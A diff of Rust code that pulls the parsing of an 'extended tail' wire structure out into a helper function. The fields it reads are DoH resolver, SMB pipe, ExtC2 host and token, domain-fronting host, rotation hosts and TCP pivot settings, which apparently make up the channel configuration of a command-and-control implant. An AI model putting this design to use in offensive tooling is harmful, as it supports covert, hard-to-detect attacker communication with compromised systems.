@@ -216,37 +216,7 @@ fn decode_extended_tail(
     WireError,
 > {
     if r.remaining() > 0 {
-        let primary_channel = r.u8()?;
-        let fallback_bitmap = r.u8()?;
-        let doh_resolver = r.str()?;
-        let smb_pipe_name = r.str()?;
-        let extc2_api_host = r.str()?;
-        let extc2_token = r.str()?;
-        // spec-7 HTTP enhancement fields — further backward compat layer.
-        let (rotation_hosts, fronting_host, proxy_server) = if r.remaining() > 0 {
-            (r.str()?, r.str()?, r.str()?)
-        } else {
-            (String::new(), String::new(), String::new())
-        };
-        // spec-3 raw pivot fields — further backward compat layer.
-        let (tcp_peer_host, tcp_peer_port) = if r.remaining() > 0 {
-            (r.str()?, r.u16()?)
-        } else {
-            (String::new(), 0)
-        };
-        Ok((
-            primary_channel,
-            fallback_bitmap,
-            doh_resolver,
-            smb_pipe_name,
-            extc2_api_host,
-            extc2_token,
-            rotation_hosts,
-            fronting_host,
-            proxy_server,
-            tcp_peer_host,
-            tcp_peer_port,
-        ))
+        decode_extended_tail_present(r)
     } else {
         Ok((
             0,
@@ -262,4 +232,55 @@ fn decode_extended_tail(
             0,
         ))
     }
+}
+
+/// Parse the present channel-dispatcher tail (spec-1), including the spec-7
+/// HTTP enhancement and spec-3 raw pivot backward-compat layers.
+fn decode_extended_tail_present(r: &mut Reader) -> Result<
+    (
+        u8,
+        u8,
+        String,
+        String,
+        String,
+        String,
+        String,
+        String,
+        String,
+        String,
+        u16,
+    ),
+    WireError,
+> {
+    let primary_channel = r.u8()?;
+    let fallback_bitmap = r.u8()?;
+    let doh_resolver = r.str()?;
+    let smb_pipe_name = r.str()?;
+    let extc2_api_host = r.str()?;
+    let extc2_token = r.str()?;
+    // spec-7 HTTP enhancement fields — further backward compat layer.
+    let (rotation_hosts, fronting_host, proxy_server) = if r.remaining() > 0 {
+        (r.str()?, r.str()?, r.str()?)
+    } else {
+        (String::new(), String::new(), String::new())
+    };
+    // spec-3 raw pivot fields — further backward compat layer.
+    let (tcp_peer_host, tcp_peer_port) = if r.remaining() > 0 {
+        (r.str()?, r.u16()?)
+    } else {
+        (String::new(), 0)
+    };
+    Ok((
+        primary_channel,
+        fallback_bitmap,
+        doh_resolver,
+        smb_pipe_name,
+        extc2_api_host,
+        extc2_token,
+        rotation_hosts,
+        fronting_host,
+        proxy_server,
+        tcp_peer_host,
+        tcp_peer_port,
+    ))
 }
